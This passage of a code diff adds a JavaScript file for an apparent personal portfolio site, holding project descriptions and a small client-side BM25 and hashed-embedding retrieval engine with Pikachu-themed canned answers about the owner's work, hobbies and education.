+    "content": "Healthcare Utilization Risk Pipeline: Flags heart risk before it becomes an ER visit.. Care teams can't call everyone, so they need to know who to call first. This pipeline loads patient data into SQLite, engineers features in SQL, trains a Random Forest, and serves the results in a Streamlit dashboard. Every modelling choice was made by measuring the data, not by following a checklist. Highlights: **Skipped rebalancing on purpose:** the measured class ratio (1.196:1) didn't need it. **Used PCA only where it helps:** for the dashboard plot, not the model. **Dashboard never retrains:** it reads saved results, so it's fast and consistent. Honest note: 303 patients is small, so this proves the pipeline, not a clinical model. Verified link: https://github.com/advaithsarva/healthcare-utilization-risk-pipeline",
+    "stats": "`0.8801` ROC-AUC · `0.9051` PR-AUC · `7/7` tests on real data",
+    "slug": "healthcare-utilization-risk-pipeline"
+  },
+  {
+    "id": "proj-air-quality-forecasting",
+    "title": "Air Quality Forecasting (ML & Data)",
+    "category": "ML & Data",
+    "tags": [
+      "Python",
+      "Time Series",
+      "PyTorch",
+      "scikit-learn",
+      "ML & Data",
+      "Air Quality Forecasting",
+      "air-quality-forecasting"
+    ],
+    "content": "Air Quality Forecasting: Linear regression beat the LSTM, and here's the proof.. Deep learning isn't always the answer, and this project measures it. Using 43,824 hourly readings and strict walk-forward validation (no peeking at the future), it compares a seasonal baseline, linear regression and a tuned LSTM. Highlights: **Honest winner:** linear regression, MAE 41.47. The LSTM beats the naive baseline but not linear. **Found and fixed a scaling bug** that had made the first LSTM worse than every baseline (MAE 86.7). Honest note: Forecasts are daily, not hourly, and the LSTM search was kept small. Verified link: https://github.com/advaithsarva/air-quality-multivariate-forecasting",
+    "stats": "MAE `41.47` linear vs `44.97` LSTM · `5`-fold walk-forward · `7/7` tests",
+    "slug": "air-quality-forecasting"
+  },
+  {
+    "id": "proj-experiment-tracking-dashboard",
+    "title": "Experiment Tracking Dashboard (ML & Data)",
+    "category": "ML & Data",
+    "tags": [
+      "Python",
+      "SQLite",
+      "MLOps",
+      "ML & Data",
+      "Experiment Tracking Dashboard",
+      "experiment-tracking-dashboard"
+    ],
+    "content": "Experiment Tracking Dashboard: Kill bad training runs early and save half your compute.. No server, no account, no install: just SQLite. A test kills the process mid-run to prove not a single metric is lost. Detectors watch each run and flag it before it wastes hours. Highlights: **Crash-proof, and tested that way:** all 50 metrics survive a hard kill. **One fix for four bugs:** a moving median took detection from 11/20 to 18/20. **Shows the cost next to the win:** the 16.7% false-alarm rate is published beside the savings. Honest note: Measured on 60 seeded runs. Next: real training jobs. Verified link: https://github.com/advaithsarva/experiment-tracking-dashboard",
+    "stats": "`100%` bad runs caught · `55.1%` compute saved · `16.7%` false alarms",
+    "slug": "experiment-tracking-dashboard"
+  },
+  {
+    "id": "proj-transformer-from-scratch",
+    "title": "Transformer from Scratch (Systems from Scratch)",
+    "category": "Systems from Scratch",
+    "tags": [
+      "Python",
+      "PyTorch",
+      "Deep Learning",
+      "Transformers",
+      "Systems from Scratch",
+      "Transformer from Scratch",
+      "transformer-from-scratch"
+    ],
+    "content": "Transformer from Scratch: Every layer of a GPT-style model, written by hand and proven correct.. \"From scratch\" usually means \"trust me.\" Here it's tested: attention, LayerNorm and GELU are all hand-written and checked against the built-ins they replace. Training data with a known entropy gives the loss a hard floor to aim at. Highlights: **Proved it can't cheat:** a causality test is shown to catch a deliberately leaky model. **Published three experiments that failed,** including a copy task stuck at chance. **A six-way ablation found nothing,** and the write-up explains exactly why. Honest note: On the simplest data, a counting model is optimal and edges out the transformer. Verified link: https://github.com/advaithsarva/transformer-from-scratch",
+    "stats": "`1e-5` match to PyTorch · `1.0059×` the theoretical best · `19` tests",
+    "slug": "transformer-from-scratch"
+  },
+  {
+    "id": "proj-tcp-stack-from-scratch",
+    "title": "TCP Stack from Scratch (Systems from Scratch)",
+    "category": "Systems from Scratch",
+    "tags": [
+      "Python",
+      "Networking",
+      "Protocols",
+      "Systems from Scratch",
+      "TCP Stack from Scratch",
+      "tcp-stack-from-scratch"
+    ],
+    "content": "TCP Stack from Scratch: The internet's core protocol, rebuilt from raw bytes.. TCP is the protocol almost everything relies on, and almost nobody has built. This stack implements the full RFC 793 lifecycle with no socket in the protocol code. An injected clock makes a 60-second timeout testable in microseconds. Highlights: **Fixed three bugs that hang silently,** including a handshake deadlock when the final ACK is lost. **Measured, not assumed:** fast retransmit recovers 1.32× faster, and throughput collapses 6,600× between 5% and 20% loss. Honest note: Runs over a simulated link, not a real network card. Verified link: https://github.com/advaithsarva/tcp-stack-from-scratch",
+    "stats": "`30%` packet loss survived · `16×` faster than stop-and-wait · `28` tests",
+    "slug": "tcp-stack-from-scratch"
+  },
+  {
+    "id": "proj-mini-container-orchestrator",
+    "title": "Mini Container Orchestrator (Systems from Scratch)",
+    "category": "Systems from Scratch",
+    "tags": [
+      "Python",
+      "Distributed Systems",
+      "Kubernetes Concepts",
+      "Systems from Scratch",
+      "Mini Container Orchestrator",
+      "mini-container-orchestrator"
+    ],
+    "content": "Mini Container Orchestrator: A working mini-Kubernetes, in plain Python.. The ideas behind Kubernetes, built from the ground up: a versioned state store, a bin-packing scheduler, controllers that keep reconciling, and a kubectl-style CLI. Compare-and-swap makes the classic \"two controllers, four pods\" race impossible. Highlights: **Rolls back bad deploys by itself:** a broken image returns to 3/3 healthy. **Solved the mystery of a cluster that did nothing:** mismatched clocks had made every node look dead. Honest note: The real Docker runtime is written but untested, since no Docker daemon was available. Verified link: https://github.com/advaithsarva/mini-container-orchestrator",
+    "stats": "`6/6` pods survive node death · `≥3/4` ready during every rollout · `25` tests",
+    "slug": "mini-container-orchestrator"
+  },
+  {
+    "id": "proj-mini-db-engine",
+    "title": "Mini DB Engine (Systems from Scratch)",
+    "category": "Systems from Scratch",
+    "tags": [
+      "Python",
+      "Databases",
+      "Storage Engines",
+      "Systems from Scratch",
+      "Mini DB Engine",
+      "mini-db-engine"
+    ],
+    "content": "Mini DB Engine: A real database, with no database library underneath.. How does a database actually keep your data safe? This engine answers that with 4 KB pages, a B+tree index, an LRU buffer pool, write-ahead logging and transactions. A no-steal, force-at-commit design means recovery only ever has to redo, never undo. Highlights: **Crash recovery made simple** by designing the buffer policy around it. **Index proven under pressure** by forcing multiple root splits. Honest note: A learning engine, not tuned for speed or concurrency. Verified link: https://github.com/advaithsarva/mini-db-engine",
+    "stats": "`8/8` eval cases · B+tree index · crash-safe WAL",
+    "slug": "mini-db-engine"
+  },
+  {
+    "id": "proj-cpu-scheduler-simulator",
+    "title": "CPU Scheduler Simulator (Systems from Scratch)",
+    "category": "Systems from Scratch",
+    "tags": [
+      "Python",
+      "Operating Systems",
+      "Algorithms",
+      "Systems from Scratch",
+      "CPU Scheduler Simulator",
+      "cpu-scheduler-simulator"
+    ],
+    "content": "CPU Scheduler Simulator: Picking the right scheduler cuts waiting time nearly in half.. FCFS, SJF, SRTF, Round Robin and Priority, side by side. Correctness is checked by a strict timeline rule across 200 random workloads, not by eyeballing averages. It runs on plain Python with nothing to install. Highlights: **Measured the payoff:** 40.9–48.9% less waiting than the round-robin default, and no workload got worse. **See it:** `viewer.html` draws the timeline in your browser. Honest note: Workloads are synthetic. Verified link: https://github.com/advaithsarva/cpu-scheduler-simulator",
+    "stats": "up to `48.9%` less waiting · `1,500` workloads tested · `0` made worse",
+    "slug": "cpu-scheduler-simulator"
+  },
+  {
+    "id": "proj-protocol-dissector-dashboard",
+    "title": "Protocol Dissector Dashboard (Systems from Scratch)",
+    "category": "Systems from Scratch",
+    "tags": [
+      "Python",
+      "Networking",
+      "Security",
+      "Packet Analysis",
+      "Systems from Scratch",
+      "Protocol Dissector Dashboard",
+      "protocol-dissector-dashboard"
+    ],
+    "content": "Protocol Dissector Dashboard: Wireshark-style packet analysis, built with no packet library.. Capture files can lie about their own lengths, and a careless parser will read the next packet as this one's data without ever crashing. This dissector treats every length field as hostile and checks every read, from Ethernet up to the application layer. Highlights: **Found the planted port scanner** with zero false alarms. **Every alert shows its receipts:** the packet numbers behind it. **Survives malformed input:** 8 deliberately broken frames are handled cleanly. Honest note: Live capture needs raw-socket access and hasn't been run yet. Verified link: https://github.com/advaithsarva/protocol-dissector-dashboard",
+    "stats": "`1/1` hidden scanner found · `0` false alarms · `29` tests",
+    "slug": "protocol-dissector-dashboard"
+  },
+  {
+    "id": "proj-document-data-extractor",
+    "title": "Document Data Extractor (Full-Stack)",
+    "category": "Full-Stack",
+    "tags": [
+      "React",
+      "Flask",
+      "OCR",
+      "spaCy",
+      "Python",
+      "Full-Stack",
+      "Document Data Extractor",
+      "document-data-extractor"
+    ],
+    "content": "Document Data Extractor: Drop in a document, get clean data back.. The original version couldn't even read its own sample file. The rebuild reads text layers with PyMuPDF, falls back to OCR for scans, and pulls out entities with spaCy and pattern matching. Your file is processed in memory and never saved to disk. Highlights: **Nine defects, two root causes,** found and fixed. **Faster and more accurate:** a smaller model raised name precision from 0.73 to 0.97 and runs 7× faster. **Proven against the old code:** 10/10 tests pass on the rebuild and 1/10 on the original. Honest note: Tested on 30 seeded fixtures. Next: real-world documents. Verified link: https://github.com/advaithsarva/document-data-extractor",
+    "stats": "`1.00` recall · `0` failures in 90 docs · address recall `0.10 → 1.00`",
+    "slug": "document-data-extractor"
+  },
+  {
+    "id": "proj-museum-collection-manager",
+    "title": "Museum Collection Manager (Full-Stack)",
+    "category": "Full-Stack",
+    "tags": [
+      "Node.js",
+      "Express",
+      "SQLite",
+      "JavaScript",
+      "Flask",
+      "Full-Stack",
+      "Museum Collection Manager",
+      "museum-collection-manager"
+    ],
+    "content": "Museum Collection Manager: A museum's collection online, with its secrets kept.. Museums publish some things and must protect others: who donated a piece, and what it's worth. Every page here passes through one publish gate, and hidden works return \"not found\" so nobody can count what's unreleased. Search forgives typos, and falls back to plain SQL if that service is down. Highlights: **Closed two live leaks** that exposed unpublished works and donor valuations. **Secure logins with no auth library:** signed, expiring sessions and lockout after 5 failed attempts. **Brought a dead feature back:** creating artworks had been failing on every request. Honest note: The UI still uses emoji as icons. Next: a proper icon set. Verified link: https://github.com/advaithsarva/museum-collection-manager",
+    "stats": "`17` REST endpoints · `2` data leaks closed · `35` tests",
+    "slug": "museum-collection-manager"
+  },
+  {
+    "id": "proj-personal-finance-planner",
+    "title": "Personal Finance Planner (Full-Stack)",
+    "category": "Full-Stack",
+    "tags": [
+      "Node.js",
+      "Express",
+      "LLM",
+      "JavaScript",
+      "Full-Stack",
+      "Personal Finance Planner",
+      "personal-finance-planner"
+    ],
+    "content": "Personal Finance Planner: The math is done by code. The AI just explains it.. Asking an AI to do your finances means trusting numbers nobody checked. Here every figure is computed and tested in code: 50/30/20 budgets, savings splits, age-based allocation, inflation-adjusted projections. The LLM only explains the plan. Highlights: **From untestable to 11 tests:** the rebuild passes 11/11, and 10 of them fail on the original. **Works even when the AI doesn't:** no key or a failed call still returns every figure. **Lighter:** React and five other packages replaced with one static page. Honest note: The AI explanation layer hasn't been run with a real key yet. Verified link: https://github.com/advaithsarva/personal-finance-planner",
+    "stats": "`17` figures per plan · `<0.005 ms` to compute · dependencies `5 → 1`",
+    "slug": "personal-finance-planner"
+  },
+  {
+    "id": "proj-query-plan-visualizer",
+    "title": "Query Plan Visualizer (Full-Stack)",
+    "category": "Full-Stack",
+    "tags": [
+      "React",
+      "D3",
+      "Flask",
+      "PostgreSQL",
+      "Full-Stack",
+      "Query Plan Visualizer",
+      "query-plan-visualizer"
+    ],
+    "content": "Query Plan Visualizer: See why your SQL is slow, then test the fix risk-free.. Raw `EXPLAIN ANALYZE` output is a wall of nested JSON. This turns it into a clickable tree and points at the slow node. The index-compare mode creates the index inside a transaction, measures it, and rolls it back, so your live database never changes. Highlights: **Tested before trusted:** the first eval run caught two real gaps, which are now fixed. **Found a regex bug by running against a real database** instead of trusting the code. Honest note: The 2.8× figure is from August 2026. Next: re-measure it. Verified link: https://github.com/advaithsarva/query-plan-visualizer",
+    "stats": "`2.8×` speedup (12.1 → 4.3 ms) · `8/8` eval cases · `0` risk to your schema",
+    "slug": "query-plan-visualizer"
+  },
+  {
+    "id": "proj-multi-cloud-cost-estimator",
+    "title": "Multi-Cloud Cost Estimator (Full-Stack)",
+    "category": "Full-Stack",
+    "tags": [
+      "Python",
+      "Cloud",
+      "AWS",
+      "GCP",
+      "Azure",
+      "Full-Stack",
+      "Multi-Cloud Cost Estimator",
+      "multi-cloud-cost-estimator"
+    ],
+    "content": "Multi-Cloud Cost Estimator: Same app, three clouds, up to 36% price difference.. Cloud pricing is designed to be hard to compare. This tool prices one YAML spec on all three providers from an offline price book, with units built in so an hourly rate can never be mixed up with a monthly one. Highlights: **Cut through the marketing:** a 46% headline discount turned out to be 21.3% of the real bill. **Separates sure savings from maybe savings.** Honest note: Prices are entered by hand and dated. Next: live price feeds. Verified link: https://github.com/advaithsarva/multi-cloud-cost-estimator",
+    "stats": "`18–36%` price spread · `46%` \"discount\" that's really `21.3%` · `28` tests",
+    "slug": "multi-cloud-cost-estimator"
+  },
+  {
+    "id": "proj-superbrain-mcp",
+    "title": "Superbrain MCP (Full-Stack)",
+    "category": "Full-Stack",
+    "tags": [
+      "Python",
+      "MCP",
+      "SQLite",
+      "AI Agents",
+      "Full-Stack",
+      "Superbrain MCP",
+      "superbrain-mcp"
+    ],
+    "content": "Superbrain MCP: One memory shared by all my AI agents.. Every AI chat starts from zero. Superbrain fixes that with shared short-term memory, long-term memory, a knowledge graph, an event log, saved workflows and tasks, all through the Model Context Protocol. It stores and recalls; the agent that calls it does the thinking. Highlights: **Fast and permanent:** short-term memory lives in RAM, and everything else is stored in SQLite. **Small footprint:** only three dependencies. Honest note: No automated tests yet. Verified link: Private repo",
+    "stats": "`41` tools · `8` memory types · used daily",
+    "slug": "superbrain-mcp"
+  },
+  {
+    "id": "proj-zero-code-review",
+    "title": "ZERO (code review) (In Progress)",
+    "category": "In Progress",
+    "tags": [
+      "Node.js",
+      "VS Code Extension",
+      "Git",
+      "LLM",
+      "In Progress",
+      "ZERO (code review)",
+      "zero-code-review"
+    ],
+    "content": "ZERO (code review): Git remembers the code. ZERO remembers everything around it.. Git tells you what changed. ZERO tells you who changed it, why, under which rules, and what was assumed. Some checks are plain logic (secrets, tests, ownership), and one has a model read your team's own instructions. It runs as a CLI and as a VS Code panel. Highlights: **Records live in your repo** as markdown, so they travel with git. **Built for teams:** a pre-push gate, code ownership and access roles. Honest note: Pre-release, not published yet. Verified link: Private repo",
+    "stats": "`1` engine for terminal and editor · `0` runtime dependencies · pre-release",
+    "slug": "zero-code-review"
+  },
+  {
+    "id": "proj-zero-cursor-agent",
+    "title": "Zero (cursor agent) (In Progress)",
+    "category": "In Progress",
+    "tags": [
+      "Electron",
+      "Node.js",
+      "Windows UI Automation",
+      "In Progress",
+      "Zero (cursor agent)",
+      "zero-cursor-agent"
+    ],
+    "content": "Zero (cursor agent): An AI that lives on your cursor.. Not a chatbot, not a sidebar: a layer that sits on your cursor. It already sees what you point at, including the element's name, type, app and what you can do with it. Next it learns to act, and to teach you how it did it. Highlights: **It can already see:** it reads the UI element under the cursor twice a second. **Stays out of your way:** clicks pass straight through it. Honest note: Early stage. It sees but doesn't act yet. Verified link: Private repo",
+    "stats": "`8 ms` cursor follow · `7` interaction types detected · early stage",
+    "slug": "zero-cursor-agent"
+  },
+  {
+    "id": "proj-zero-01",
+    "title": "zero-01 (In Progress)",
+    "category": "In Progress",
+    "tags": [
+      "Python",
+      "PyTorch",
+      "LLM",
+      "In Progress",
+      "In Progress",
+      "zero-01",
+      "zero-01"
+    ],
+    "content": "zero-01: Building a language model from the first token up.. To really understand LLMs, build one. Every piece will be written by hand and measured, starting with the tokenizer and training on Colab. Highlights:  Honest note: No code yet. Don't feature it until there's a trained checkpoint. Verified link: Private repo",
+    "stats": "Design stage · model size decided after a benchmark sweep",
+    "slug": "zero-01"
+  },
+  {
+    "id": "proj-eval-gap-research",
+    "title": "Eval Gap Research (In Progress)",
+    "category": "In Progress",
+    "tags": [
+      "Python",
+      "LLM Evaluation",
+      "Research",
+      "In Progress",
+      "Eval Gap Research",
+      "eval-gap-research"
+    ],
+    "content": "Eval Gap Research: How do you grade an AI when there's no right answer?. AI agents improve fast wherever there's a test to pass. Most real tasks have no test. This project asks whether an AI judge with a checklist can fill that gap, and measures when its confidence can be trusted. Highlights: **The scores work:** good and bad output separate cleanly. **The confidence signal doesn't, yet:** subtly wrong answers still scored full marks, and the experiment shows why. Honest note: Eight examples on one model, so it's directional only. Next: rubrics from several different models. Verified link: Not public yet",
+    "stats": "`1.00` vs `0.31` good vs bad separation · n = `8`, early results",
+    "slug": "eval-gap-research"
+  }
+];
+
+  // 1. Text Tokenizer & Normalizer
+  function tokenize(text) {
+    if (!text) return [];
+    return text
+      .toLowerCase()
+      .replace(/[^a-z0-9\s]/g, ' ')
+      .split(/\s+/)
+      .filter(w => w.length > 1 && !STOPWORDS.has(w));
+  }
+
+  const STOPWORDS = new Set([
+    'a', 'about', 'above', 'after', 'again', 'against', 'all', 'am', 'an', 'and', 'any', 'are', 'aren', 'as', 'at',
+    'be', 'because', 'been', 'before', 'being', 'below', 'between', 'both', 'but', 'by', 'can', 'cannot', 'could',
+    'did', 'do', 'does', 'doing', 'down', 'during', 'each', 'few', 'for', 'from', 'further', 'had', 'has', 'have',
+    'having', 'he', 'her', 'here', 'hers', 'herself', 'him', 'himself', 'his', 'how', 'i', 'if', 'in', 'into', 'is',
+    'it', 'its', 'itself', 'let', 'me', 'more', 'most', 'my', 'myself', 'no', 'nor', 'not', 'of', 'off', 'on', 'once',
+    'only', 'or', 'other', 'ought', 'our', 'ours', 'ourselves', 'out', 'over', 'own', 'same', 'she', 'should', 'so',
+    'some', 'such', 'than', 'that', 'the', 'their', 'theirs', 'them', 'themselves', 'then', 'there', 'these', 'they',
+    'this', 'those', 'through', 'to', 'too', 'under', 'until', 'up', 'very', 'was', 'we', 'were', 'what', 'when',
+    'where', 'which', 'while', 'who', 'whom', 'why', 'with', 'would', 'you', 'your', 'yours', 'yourself', 'yourselves'
+  ]);
+
+  // 2. Build Vocabulary & Inverted Index for BM25
+  const N = CORPUS.length;
+  const docTokens = CORPUS.map(c => tokenize(c.title + ' ' + c.tags.join(' ') + ' ' + c.content));
+  const docLens = docTokens.map(t => t.length);
+  const avgDocLen = docLens.reduce((a, b) => a + b, 0) / (N || 1);
+
+  const df = {};
+  docTokens.forEach(tokens => {
+    const unique = new Set(tokens);
+    unique.forEach(term => {
+      df[term] = (df[term] || 0) + 1;
+    });
+  });
+
+  // IDF calculation
+  const idf = {};
+  Object.keys(df).forEach(term => {
+    idf[term] = Math.log(1 + (N - df[term] + 0.5) / (df[term] + 0.5));
+  });
+
+  // 3. Dense Vector Embeddings (Orthogonal Hashing Subspace, d=64)
+  const DIM = 64;
+
+  function hashTermToDim(term) {
+    let hash = 0;
+    for (let i = 0; i < term.length; i++) {
+      hash = ((hash << 5) - hash) + term.charCodeAt(i);
+      hash |= 0;
+    }
+    return Math.abs(hash) % DIM;
+  }
+
+  function embedTokens(tokens) {
+    const vec = new Float32Array(DIM);
+    tokens.forEach(term => {
+      const d = hashTermToDim(term);
+      const weight = idf[term] || 1.0;
+      vec[d] += weight;
+    });
+    // L2 Normalize
+    let norm = 0;
+    for (let i = 0; i < DIM; i++) norm += vec[i] * vec[i];
+    norm = Math.sqrt(norm);
+    if (norm > 0) {
+      for (let i = 0; i < DIM; i++) vec[i] /= norm;
+    }
+    return vec;
+  }
+
+  const docVectors = docTokens.map(embedTokens);
+
+  function cosineSimilarity(vecA, vecB) {
+    let dot = 0;
+    for (let i = 0; i < DIM; i++) {
+      dot += vecA[i] * vecB[i];
+    }
+    return Math.max(0, dot);
+  }
+
+  // 4. BM25 Scoring
+  function scoreBM25(queryTokens, docIdx, k1 = 1.5, b = 0.75) {
+    const tokens = docTokens[docIdx];
+    const len = docLens[docIdx];
+    const tf = {};
+    tokens.forEach(t => { tf[t] = (tf[t] || 0) + 1; });
+
+    let score = 0;
+    queryTokens.forEach(term => {
+      if (tf[term]) {
+        const termIdf = idf[term] || 0.5;
+        const termTf = tf[term];
+        const denom = termTf + k1 * (1 - b + b * (len / avgDocLen));
+        score += termIdf * ((termTf * (k1 + 1)) / denom);
+      }
+    });
+    return score;
+  }
+
+  // 5. Hybrid Retrieval (Vector Cosine Sim + BM25 Fusion)
+  function retrieve(rawQuery, topK = 3) {
+    const startTime = performance.now();
+    const queryTokens = tokenize(rawQuery);
+    const queryVec = embedTokens(queryTokens);
+
+    const candidates = [];
+    for (let i = 0; i < N; i++) {
+      const cosSim = cosineSimilarity(queryVec, docVectors[i]);
+      const bm25 = scoreBM25(queryTokens, i);
+      // Normalized hybrid score
+      const hybridScore = (cosSim * 0.65) + (Math.min(bm25 / 10, 1.0) * 0.35);
+      candidates.push({
+        chunk: CORPUS[i],
+        cosSim: Number(cosSim.toFixed(4)),
+        bm25: Number(bm25.toFixed(4)),
+        score: Number(hybridScore.toFixed(4)),
+        index: i
+      });
+    }
+
+    candidates.sort((a, b) => b.score - a.score);
+    const results = candidates.slice(0, topK);
+    const latencyMs = Number((performance.now() - startTime).toFixed(2));
+
+    return {
+      query: rawQuery,
+      queryTokens: queryTokens,
+      queryVec: Array.from(queryVec.slice(0, 8)).map(n => Number(n.toFixed(3))), // preview 8 dims
+      topChunks: results,
+      latencyMs: latencyMs
+    };
+  }
+
+  // 6. Context-Augmented Generation / Response Synthesis
+  function query(rawQuery) {
+    const qLower = (rawQuery || '').toLowerCase();
+    
+    // Ghost Check (Playful easter egg)
+    const isGhost = ['ghost', 'ghosts', 'gengar', 'gastly', 'haunter', 'spook', 'horror', 'scare', 'scary', 'boo'].some(w => qLower.includes(w));
+    if (isGhost) {
+      return {
+        isGhost: true,
+        answer: "P-Pika-PI?! 👻⚡ <em>*shivers and cowers behind tail with sparks flying*</em> SHHHH! Don't summon Gengar! Between you and me, Advaith is <strong>genuinely terrified of ghosts</strong>, haunted houses, horror movies, and Ghost-type Pokémon! He will literally sprint across the pitch to escape! Please, let's stick to chess, PyTorch, or Electric types! 🙈⚡",
+        retrieval: retrieve(rawQuery, 2),
+        citations: ["weakness-ghosts"]
+      };
+    }
+
+    const retrieval = retrieve(rawQuery, 3);
+    const top = retrieval.topChunks;
+
+    if (!top || top.length === 0 || top[0].score < 0.05) {
+      return {
+        isGhost: false,
+        answer: "Pikachu! ⚡ Advaith is a GenAI & Systems Engineer building Graph-RAG architectures and autonomous agents. He also plays chess (Sicilian defense), plays football, beatboxes, follows geopolitics, and completed his SMU exchange with a 3.47 CGPA—just don't mention spooky ghosts! 👻 Try asking about his projects or hobbies!",
+        retrieval: retrieval,
+        citations: ["bio-general"]
+      };
+    }
+
+    const best = top[0].chunk;
+    const citations = top.map(t => t.chunk.id);
+    let answerText = "";
+
+    // Contextual phrasing based on best retrieved category
+    if (best.id === 'hobby-chess') {
+      answerText = "Pika! ♟️ Advaith is a passionate chess player! He loves sharp tactical combinations and the <strong>Sicilian Defense (1. e4 c5)</strong>. He's always up for a rapid (10m) or blitz (3+2 / 5+3) match on Chess.com and Lichess (<code>@advaithsarva</code>). Reach out anytime for a game!";
+    } else if (best.id === 'hobby-football') {
+      answerText = "Chu! ⚽ On the pitch, Advaith plays football with high-pressing attacking coordination and counter-attacks. When he isn't training neural nets or testing MCP harnesses, you'll find him playing on the field or discussing European football tactics!";
+    } else if (best.id === 'hobby-beatbox') {
+      answerText = "Pika-tsh-ka-boom! 🎤 Yes! Advaith can beatbox! Between mathematical proofs and low-level code, he drops acoustic basslines, rhythm loops, and freestyle vocal percussion. Ask him for a live beatbox demo when you connect!";
+    } else if (best.id === 'hobby-debate') {
+      answerText = "Pikachu! 🎙️ Advaith is a seasoned debater and former Executive Leader at CODE{X}! He loves structured argumentation, logical rigour, and dissecting persuasion tactics. That passion for rhetorical analysis is what inspired his <em>Media NLP Rhetoric & Bias Detection Pipeline</em>!";
+    } else if (best.id === 'hobby-news-geopolitics') {
+      answerText = "⚡ Pika! Advaith is a true knowledge and news maniac! He starts every day devouring global news, technical arXiv preprints, and geopolitical analyses. He loves analyzing macro shifts, treaties, and international statecraft!";
+    } else if (best.id === 'culture-heritage') {
+      answerText = "✨ Pika! Advaith deeply honors his cultural roots and heritage! He draws immense grounding from classical Indian philosophy, timeless traditions, and cultural pride, carrying those values from Washington to Hyderabad!";
+    } else if (best.id === 'edu-smu') {
+      answerText = "🎓 Pika! Advaith completed his international exchange at <strong>Saint Martin's University (Lacey, WA, USA)</strong> in May 2026 across two semesters with a <strong>3.47 / 4.0 CGPA</strong> and Dean's List honors! He studied Distributed Systems, Machine Learning, and Computer Vision while mentoring peers in the Center for Student Success.";
+    } else if (best.id === 'edu-woxsen') {
+      answerText = "🎓 Pika! At <strong>Woxsen University (Hyderabad, India)</strong>, Advaith is pursuing his B.Tech in CSE (AI & ML) with an <strong>8.69 / 10 CGPA</strong> (Expected August 2027)!";
+    } else if (best.id === 'exp-preventvital') {
+      answerText = "Pika! 🔍 At Preventvital (GruentzigAI), Advaith audited backend ML inference architectures. He caught a critical coefficient sign inversion error in the ASCVD (cardiovascular) clinical risk calculation engine that was artificially returning a 0.1% baseline risk for untreated patients! He reproduced the calculation against the published Goff 2014 trial baseline (expected 2.1%), wrote up the bug report for clinical sign-off, and authored RAG & safety rules adhering to ICMR 2023 guidelines on an 'engine computes, LLM explains, clinician signs' protocol!";
+    } else if (best.id === 'achieve-ibm') {
+      answerText = "🏆 Pika-power! In the IBM BOB National Hackathon 2026, Advaith led engineering for <strong>The Sentinel Grid</strong>, placing <strong>Top 5 in the South Zone</strong>! The disaster-intelligence system comprises 6,957 lines of Python, 314 automated checks, and 104 formula audits, achieving a verified <strong>ROC-AUC of 0.9924</strong> on 473,000 district-month soil moisture observations!";
+    } else if (best.slug) {
+      // Project match!
+      const proj = best;
+      answerText = `🚀 Pika! <strong>${proj.title}</strong>:<br>${proj.content}<br><em>Key Metrics:</em> <code>${proj.stats}</code>.<br><a href="project.html?id=${proj.slug}" class="text-blue" style="font-weight:700; text-decoration:underline;">View Full Project Page →</a>`;
+    } else {
+      answerText = `⚡ Pika! Based on verified data:<br>${best.content}<br><em>Source:</em> <code>${best.title}</code>`;
+    }
+
+    return {
+      isGhost: false,
+      answer: answerText,
+      retrieval: retrieval,
+      citations: citations
+    };
+  }
+
+  // Public Interface
+  root.AdvaithRAG = {
+    corpus: CORPUS,
+    retrieve: retrieve,
+    query: query,
+    stats: {
+      totalChunks: N,
+      vocabSize: Object.keys(df).length,
+      embeddingDim: DIM
+    }
+  };
+
+  console.log(`[RAG ENGINE READY] Loaded ${N} chunks, ${Object.keys(df).length} terms, ${DIM}-d vector space.`);
+
+})(typeof window !== 'undefined' ? window : globalThis);
+
